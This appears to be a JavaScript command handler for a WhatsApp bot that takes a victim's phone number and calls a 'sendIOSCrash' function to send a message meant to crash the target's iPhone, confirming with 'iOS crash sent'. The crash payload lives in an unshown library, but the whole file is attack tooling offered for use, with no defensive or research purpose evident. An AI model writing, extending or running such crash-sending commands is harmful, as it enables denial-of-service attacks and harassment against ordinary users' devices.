const { sendIOSCrash } = require('../lib/bugfunctions');
const {
  normalizeNumber,
  getText,
  toJid
} = require('../Utils/helper');

async function ioscrashCommand(sock, chatId, message) {
  try {
    // ❌ Block group usage
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ Private only command'
      }, { quoted: message });
    }

    // ✅ ONLY BOT ACCOUNT
    if (!message.key.fromMe) {
      return sock.sendMessage(chatId, {
        text: '❌ This command is for premium users only'
      }, { quoted: message });
    }

    const text = getText(message);
    const args = text.trim().split(/\s+/);

    let number = normalizeNumber(args[1]);

    // ❌ no number
    if (!number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .ioscrash 2547xxxxxxx'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `📱 Sending iOS crash to ${number}...`
    }, { quoted: message });

    await sendIOSCrash(sock, target);

    await sock.sendMessage(chatId, {
      text: `✅ iOS crash sent`
    }, { quoted: message });

  } catch (e) {
    console.error("IOSCRASH ERROR:", e);

    await sock.sendMessage(chatId, {
      text: '❌ Error sending iOS crash'
    }, { quoted: message }).catch(() => {});
  }
}

module.exports = ioscrashCommand;
